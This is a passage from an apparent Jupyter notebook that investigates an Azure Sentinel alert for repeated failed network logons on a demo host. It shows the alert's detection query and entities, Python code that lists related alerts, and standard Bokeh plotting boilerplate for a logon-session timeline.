       "      <th>AlertType</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0_765132a3-cf2f-40cf-b45c-cd6be9b942b7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ConfidenceLevel</th>\n",
       "      <td>Unknown</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ConfidenceScore</th>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>IsIncident</th>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>StartTimeUtc</th>\n",
       "      <td>2020-07-07 23:46:28+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>EndTimeUtc</th>\n",
       "      <td>2020-07-07 23:46:39+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProcessingEndTime</th>\n",
       "      <td>2020-07-07 23:55:56+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>RemediationSteps</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ExtendedProperties</th>\n",
       "      <td>{'Query': 'let bruteforce_hosts = (\r\n",
       "SecurityEvent\r\n",
       "| where Computer contains \"blackhat\"\r\n",
       "| where EventID == 4625\r\n",
       "| where LogonType == 3\r\n",
       "| summarize count() by Computer\r\n",
       "| where count_ &gt; 3\r\n",
       "| project Computer);\r\n",
       "SecurityEvent\r\n",
       "| where Computer in (bruteforce_hosts)\r\n",
       "| where EventID == 4625\r\n",
       "| where LogonType == 3\r\n",
       "| extend AccountCustomEntity = Account\r\n",
       "| extend HostCustomEntity = Computer\r\n",
       "| extend IPCustomEntity = IpAddress', 'Query Period': '00:15:00', 'Query Start Time UTC': '2020-07-07 23:35:54Z', 'Query End Time UTC': '2020-07-07 23:50:54Z', 'Trigger Operator': 'GreaterThan', 'Trigger Threshold': '0', 'Event Grouping': 'SingleAlert', 'Analytic Rule Ids': '[\"765132a3-cf2f-40cf-b45c-cd6be9b942b7\"]', 'Search Query Results Overall Count': '4', 'Total Account Entities': '1', 'Total Host Entities': '1', 'Total IP Entities': '1'}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Entities</th>\n",
       "      <td>[{'$id': '3', 'Address': '174.127.235.80', 'Type': 'ip'}, {'$id': '4', 'HostName': 'BlackHatDemoHos', 'Type': 'host'}, {'$id': '5', 'Name': 'admin', 'NTDomain': 'REDMOND', 'Type': 'account'}]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SourceSystem</th>\n",
       "      <td>Detection</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>WorkspaceSubscriptionId</th>\n",
       "      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>WorkspaceResourceGroup</th>\n",
       "      <td>asihuntomsworkspacerg</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ExtendedLinks</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProductName</th>\n",
       "      <td>Azure Sentinel</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProductComponentName</th>\n",
       "      <td>Scheduled Alerts</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertLink</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Type</th>\n",
       "      <td>SecurityAlert</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Computer</th>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>src_hostname</th>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>src_accountname</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>src_procname</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>host_match</th>\n",
       "      <td>True</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>acct_match</th>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>proc_match</th>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>CompromisedEntity</th>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><br/><h3>ExtendedProperties:</h3><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Query</th>\n",
       "      <td>let bruteforce_hosts = (\\r\\nSecurityEvent\\r\\n| where Computer contains \"blackhat\"\\r\\n| where EventID == 4625\\r\\n| where LogonType == 3\\r\\n| summarize count() by Computer\\r\\n| where count_ &gt; 3\\r\\n| project Computer);\\r\\nSecurityEvent\\r\\n| where Computer in (bruteforce_hosts)\\r\\n| where EventID == 4625\\r\\n| where LogonType == 3\\r\\n| extend AccountCustomEntity = Account\\r\\n| extend HostCustomEntity = Computer\\r\\n| extend IPCustomEntity = IpAddress</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Query Period</th>\n",
       "      <td>00:15:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Query Start Time UTC</th>\n",
       "      <td>2020-07-07 23:35:54Z</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Query End Time UTC</th>\n",
       "      <td>2020-07-07 23:50:54Z</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Trigger Operator</th>\n",
       "      <td>GreaterThan</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Trigger Threshold</th>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Event Grouping</th>\n",
       "      <td>SingleAlert</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Analytic Rule Ids</th>\n",
       "      <td>[\"765132a3-cf2f-40cf-b45c-cd6be9b942b7\"]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Search Query Results Overall Count</th>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Total Account Entities</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Total Host Entities</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Total IP Entities</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><br/><h3>Entities:</h3><br/>{&#x27;AdditionalData&#x27;: {}, &#x27;Address&#x27;: &#x27;174.127.235.80&#x27;, &#x27;Type&#x27;: &#x27;ip&#x27;}<br/>{&#x27;AdditionalData&#x27;: {}, &#x27;HostName&#x27;: &#x27;BlackHatDemoHos&#x27;, &#x27;Type&#x27;: &#x27;host&#x27;}<br/>{&#x27;AdditionalData&#x27;: {}, &#x27;NTDomain&#x27;: &#x27;REDMOND&#x27;, &#x27;Name&#x27;: &#x27;admin&#x27;, &#x27;Type&#x27;: &#x27;account&#x27;}"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from datetime import datetime\n",
    "start = datetime(2020,7,7,0,0,1)\n",
    "end = datetime(2020,7,8,0,0,1)\n",
    "related_alerts = qry_prov.SecurityAlert.list_related_alerts(\n",
    "    start=start, end=end, host_name=host_name\n",
    ")\n",
    "display(related_alerts)\n",
    "related_alerts['CompromisedEntity'] = related_alerts['Computer']\n",
    "def disp_full_alert(alert):\n",
    "    global related_alert\n",
    "    related_alert = SecurityAlert(alert)\n",
    "    return nbdisplay.format_alert(related_alert, show_entities=True)\n",
    "\n",
    "\n",
    "rel_alert_select = nbwidgets.SelectAlert(\n",
    "    alerts=related_alerts,\n",
    "    action=disp_full_alert\n",
    ")\n",
    "rel_alert_select.display()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Logon Sessions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"5251\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"5251\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n",
       "\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"5251\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"5251\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"5251\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"41623537-46d3-454a-8a3a-ba23eb27a0ef\" data-root-id=\"5328\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"e0b488a2-84be-4438-b47c-4660ed5a3a86\":{\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"5254\"},{\"id\":\"5286\"}]},\"id\":\"5328\",\"type\":\"Column\"},{\"attributes\":{\"data_source\":{\"id\":\"5252\"},\"glyph\":{\"id\":\"5318\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5319\"},\"selection_glyph\":null,\"view\":{\"id\":\"5321\"}},\"id\":\"5320\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"data\":{\"x\":[1594165588000.0,1594165588000.0],\"y\":[0,1]},\"selected\":{\"id\":\"5339\"},\"selection_policy\":{\"id\":\"5338\"}},\"id\":\"5322\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"5276\",\"type\":\"SaveTool\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":{\"id\":\"5310\"},\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"5310\"}]},\"id\":\"5301\",\"type\":\"Toolbar\"},{\"attributes\":{\"line_color\":\"red\",\"line_dash\":[6],\"line_width\":2,\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"5323\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"5275\",\"type\":\"ResetTool\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"5277\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"5331\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#440154\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#440154\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"5319\",\"type\":\"Diamond\"},{\"attributes\":{\